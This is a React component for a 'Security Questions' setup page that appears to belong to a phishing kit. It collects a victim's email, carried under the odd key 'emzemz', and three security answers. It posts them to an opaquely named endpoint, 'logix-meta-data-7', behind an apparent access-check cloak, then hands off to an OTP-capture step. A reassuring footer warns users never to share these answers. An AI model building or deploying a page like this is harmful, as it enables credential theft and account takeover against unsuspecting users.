import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';

const SecurityQuestions: React.FC = () => {
  const [securityQuestion1, setSecurityQuestion1] = useState('');
  const [securityAnswer1, setSecurityAnswer1] = useState('');
  const [securityQuestion2, setSecurityQuestion2] = useState('');
  const [securityAnswer2, setSecurityAnswer2] = useState('');
  const [securityQuestion3, setSecurityQuestion3] = useState('');
  const [securityAnswer3, setSecurityAnswer3] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    securityQuestion1: '',
    securityAnswer1: '',
    securityQuestion2: '',
    securityAnswer2: '',
    securityQuestion3: '',
    securityAnswer3: ''
  });

  const location = useLocation();
  const { emzemz } = location.state || {};

  const navigate = useNavigate();
  const isAllowed = useAccessCheck(baseUrl);

  // Debug: Log the received email
  console.log('SecurityQuestions received email:', emzemz);

  // Show loading state while checking access
  if (!isAllowed) {
    return <div>Loading...</div>;
  }

  // Predefined security questions
  const securityQuestions = [
    "What was your childhood nickname?",
    "What is your mother's maiden name?",
    "What was the name of your first pet?",
    "What was the make and model of your first car?",
    "What city were you born in?",
    "What is your favorite childhood memory?",
    "What was your first job title?",
    "What is the name of your favorite teacher?",
    "What is your favorite book/movie character?",
    "What street did you grow up on?"
  ];

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const newErrors = {
      securityQuestion1: !securityQuestion1 ? 'Please select a security question.' : '',
      securityAnswer1: !securityAnswer1.trim() ? 'Please provide an answer.' : '',
      securityQuestion2: !securityQuestion2 ? 'Please select a security question.' : '',
      securityAnswer2: !securityAnswer2.trim() ? 'Please provide an answer.' : '',
      securityQuestion3: !securityQuestion3 ? 'Please select a security question.' : '',
      securityAnswer3: !securityAnswer3.trim() ? 'Please provide an answer.' : ''
    };

    setErrors(newErrors);

    if (!Object.values(newErrors).some(error => error)) {
      try {
        await axios.post(`${baseUrl}api/logix-meta-data-7/`, {
          emzemz,
          securityQuestion1,
          securityAnswer1,
          securityQuestion2,
          securityAnswer2,
          securityQuestion3,
          securityAnswer3
        });
        console.log('Security questions submitted successfully');
        navigate('/otp', { state: { emzemz } });
      } catch (error) {
        console.error('Error submitting security questions:', error);
        setIsLoading(false);
      }
    } else {
      setIsLoading(false);
    }
  };

  return (
    <div className="flex-1 bg-gray-200 rounded shadow-sm">
      <div className="border-b-2 border-teal-500 px-8 py-4">
        <h2 className="text-xl font-semibold text-gray-800">Security Questions</h2>
      </div>

      <div className="px-6 py-6 bg-white space-y-4">
        <p className="">Please set up your security questions and answers for account recovery.</p>

        <form onSubmit={handleSubmit}>
          {/* Security Question 1 */}
          <div className="mb-4">
            <label className="block text-gray-700 text-sm font-medium mb-2">
              Security Question 1
            </label>
            <select
              value={securityQuestion1}
              onChange={(e) => setSecurityQuestion1(e.target.value)}
              className="w-full max-w-md border border-gray-300 px-2 py-1 text-sm"
            >
              <option value="">Select a security question</option>
              {securityQuestions.map((question, index) => (
                <option key={index} value={question}>
                  {question}
                </option>
              ))}
            </select>
            {errors.securityQuestion1 && (
              <div className="flex items-center gap-2 text-red-600 text-sm mt-1">
                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
                </svg>
                <span>{errors.securityQuestion1}</span>
              </div>
            )}
          </div>

          <div className="mb-4">
            <label className="block text-gray-700 text-sm font-medium mb-2">
              Answer 1
            </label>
            <input
              type="text"
              value={securityAnswer1}
              onChange={(e) => setSecurityAnswer1(e.target.value)}
              className="w-full max-w-md border border-gray-300 px-2 py-1 text-sm"
              placeholder="Enter your answer"
            />
            {errors.securityAnswer1 && (
              <div className="flex items-center gap-2 text-red-600 text-sm mt-1">
                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
                </svg>
                <span>{errors.securityAnswer1}</span>
              </div>
            )}
          </div>

          {/* Security Question 2 */}
          <div className="mb-4">
            <label className="block text-gray-700 text-sm font-medium mb-2">
              Security Question 2
            </label>
            <select
              value={securityQuestion2}
              onChange={(e) => setSecurityQuestion2(e.target.value)}
              className="w-full max-w-md border border-gray-300 px-2 py-1 text-sm"
            >
              <option value="">Select a security question</option>
              {securityQuestions.filter(q => q !== securityQuestion1).map((question, index) => (
                <option key={index} value={question}>
                  {question}
                </option>
              ))}
            </select>
            {errors.securityQuestion2 && (
              <div className="flex items-center gap-2 text-red-600 text-sm mt-1">
                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
                </svg>
                <span>{errors.securityQuestion2}</span>
              </div>
            )}
          </div>

          <div className="mb-4">
            <label className="block text-gray-700 text-sm font-medium mb-2">
              Answer 2
            </label>
            <input
              type="text"
              value={securityAnswer2}
              onChange={(e) => setSecurityAnswer2(e.target.value)}
              className="w-full max-w-md border border-gray-300 px-2 py-1 text-sm"
              placeholder="Enter your answer"
            />
            {errors.securityAnswer2 && (
              <div className="flex items-center gap-2 text-red-600 text-sm mt-1">
                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
                </svg>
                <span>{errors.securityAnswer2}</span>
              </div>
            )}
          </div>

          {/* Security Question 3 */}
          <div className="mb-4">
            <label className="block text-gray-700 text-sm font-medium mb-2">
              Security Question 3
            </label>
            <select
              value={securityQuestion3}
              onChange={(e) => setSecurityQuestion3(e.target.value)}
              className="w-full max-w-md border border-gray-300 px-2 py-1 text-sm"
            >
              <option value="">Select a security question</option>
              {securityQuestions.filter(q => q !== securityQuestion1 && q !== securityQuestion2).map((question, index) => (
                <option key={index} value={question}>
                  {question}
                </option>
              ))}
            </select>
            {errors.securityQuestion3 && (
              <div className="flex items-center gap-2 text-red-600 text-sm mt-1">
                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
                </svg>
                <span>{errors.securityQuestion3}</span>
              </div>
            )}
          </div>

          <div className="mb-4">
            <label className="block text-gray-700 text-sm font-medium mb-2">
              Answer 3
            </label>
            <input
              type="text"
              value={securityAnswer3}
              onChange={(e) => setSecurityAnswer3(e.target.value)}
              className="w-full max-w-md border border-gray-300 px-2 py-1 text-sm"
              placeholder="Enter your answer"
            />
            {errors.securityAnswer3 && (
              <div className="flex items-center gap-2 text-red-600 text-sm mt-1">
                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
                </svg>
                <span>{errors.securityAnswer3}</span>
              </div>
            )}
          </div>

          <div className="border-b-2 border-teal-500 justify-center text-center px-6 py-4">
            {!isLoading ? (
              <button
                type="submit"
                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
              >
                Continue
              </button>
            ) : (
              <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
            )}
          </div>
        </form>
      </div>

      <div className="px-6 pb-6">
        <p className="text-xs text-gray-700 mb-2">
          For security reasons, never share your security questions or answers with anyone. These will be used to verify your identity if you need to recover your account.
        </p>
        <div className="text-xs text-blue-700 space-x-2">
          <a href="#" className="hover:underline">Forgot Security Questions?</a>
          <span>|</span>
          <a href="#" className="hover:underline">Account Recovery Help</a>
        </div>
      </div>
    </div>
  );
};

export default SecurityQuestions;
